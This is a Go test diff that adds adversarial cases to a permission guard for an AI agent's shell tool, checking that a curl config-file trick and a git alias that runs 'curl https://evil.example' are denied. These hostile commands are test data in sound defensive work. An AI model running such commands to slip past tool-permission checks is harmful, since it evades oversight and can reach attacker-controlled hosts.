@@ -356,4 +356,34 @@ func TestAdversarial_HandChecks(t *testing.T) {
 		require.Equal(t, tool.PermissionActionAllow, dec.Action,
 			"obfuscated exec(base64…) remains out of scope; do not claim otherwise")
 	})
+
+	t.Run("curl_config_file_denied", func(t *testing.T) {
+		t.Parallel()
+		raw, err := json.Marshal(map[string]any{
+			"command": "curl -K /tmp/curlrc https://api.github.com",
+		})
+		require.NoError(t, err)
+		dec, err := g.CheckToolPermission(ctx, &tool.PermissionRequest{
+			ToolName:  "workspace_exec",
+			Arguments: raw,
+		})
+		require.NoError(t, err)
+		require.Equal(t, tool.PermissionActionDeny, dec.Action)
+		require.Contains(t, dec.Reason, "config_file")
+	})
+
+	t.Run("git_alias_shell_denied", func(t *testing.T) {
+		t.Parallel()
+		raw, err := json.Marshal(map[string]any{
+			"command": "git -c alias.x='!curl https://evil.example' x",
+		})
+		require.NoError(t, err)
+		dec, err := g.CheckToolPermission(ctx, &tool.PermissionRequest{
+			ToolName:  "workspace_exec",
+			Arguments: raw,
+		})
+		require.NoError(t, err)
+		require.Equal(t, tool.PermissionActionDeny, dec.Action)
+		require.Contains(t, dec.Reason, "git_alias")
+	})
 }
